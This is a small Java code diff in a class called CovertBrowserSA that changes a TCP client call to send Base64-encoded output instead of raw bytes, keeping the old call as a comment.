@@ -364,7 +364,8 @@ public class CovertBrowserSA {
 						//System.out.println(Base64.getEncoder().encodeToString(out));
 						//System.out.println(out.length);
 
-						TCPClient.connectToBrowser(out);
+						TCPClient.connectToBrowser(Base64.getEncoder().encodeToString(out));
+						//TCPClient.connectToBrowser(out);
 
 						fw.write(out);
 						fw.close();
